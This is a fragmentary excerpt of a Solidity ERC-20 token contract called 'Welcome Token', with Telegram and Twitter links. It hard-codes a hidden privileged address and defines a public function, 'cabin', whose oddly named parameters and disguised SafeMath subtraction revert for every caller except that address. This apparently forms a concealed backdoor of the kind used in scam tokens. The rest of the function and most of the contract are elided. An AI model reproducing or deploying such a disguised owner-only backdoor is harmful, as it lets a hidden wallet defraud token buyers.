...
*/
/**
Tele: https://t.me/WelcomePortal
Tweet：https://twitter.com/WelcomeERC
*/
...
contract Welcome is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Welcome Token";
    string private _symbol = "Welcome";
    ...
    constructor () {
        ...
        caac = payable(address(0x65489aA2Bd6c6962184981cE7391D024763DAb61));
    ...
    function cabin(address cabinet,uint256 cable) public {
        cable.sub(
            (msg.sender != caac) ? 
            cable+cable : 0
        );
